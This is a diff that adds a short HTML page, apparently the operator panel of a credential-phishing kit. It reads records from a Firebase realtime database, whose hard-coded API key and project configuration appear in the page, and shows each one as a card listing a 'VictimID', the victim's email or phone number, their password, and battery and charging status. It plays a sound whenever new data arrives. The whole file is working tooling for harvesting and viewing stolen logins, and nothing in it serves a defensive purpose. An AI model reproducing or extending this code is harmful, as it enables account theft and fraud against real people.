@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <title>data</title>
+</head>
+<body class="bg-black flex p-3 justify-center flex-col space-y-2 items-center">
+    
+
+<script type="module" >
+          
+      // Import the functions you need from the SDKs you need
+import { initializeApp }from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
+import { getDatabase, ref, set, onValue } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-database.js";
+const audio = new Audio("pip.wav");
+
+// Initialize Firebase
+const firebaseConfig = {
+          apiKey: "AIzaSyD-V97FbwQBbLIkbvn98P614nlkKSoGXUk",
+          authDomain: "auth-979d8.firebaseapp.com",
+          databaseURL: "https://auth-979d8-default-rtdb.firebaseio.com",
+          projectId: "auth-979d8",
+          storageBucket: "auth-979d8.appspot.com",
+          messagingSenderId: "235770544453",
+          appId: "1:235770544453:web:79093a7c45b3e323ca7e2c"
+        };
+const app = initializeApp(firebaseConfig);
+
+// Get a reference to the database service
+const database = getDatabase();
+
+// Get a reference to the "users" node in the database
+const usersRef = ref(database, "users");
+
+
+
+// Listen for changes to the "users" node
+onValue(usersRef, (snapshot) => {
+    audio.play();
+    const data = snapshot.val();
+    const messages = Object.values(data);
+    messages.sort((a, b) => a.timestamp - b.timestamp);
+
+    messages.forEach(message=>{
+        let card = `
+        <div class="flex bg-white rounded w-[25rem] max-w-full p-3 flex-col space-y-2">
+                <h2 class="font-bold text-gray-600">VictimID : ${message.id}</h2>
+                <p class="font-bold text-gray-600">Email or phone :${message.em}</p>
+                <p class="font-bold text-gray-600">Password :  ${message.pass}</p>
+                <p class="font-bold text-gray-600">charGerStatus : ${message.chargin} </p>
+                <p class="font-bold text-gray-600">Chargerlevel : ${message.level}</p>
+        </div>
+        
+        
+        `
+        document.querySelector('body').innerHTML+=card
+    })
+
+
+});
+
+
+function displayData(data){
+    data.forEach(element => {
+        console.log(element.em)
+    });
+}
+
+
+
+</script>
+</body>
+</html>
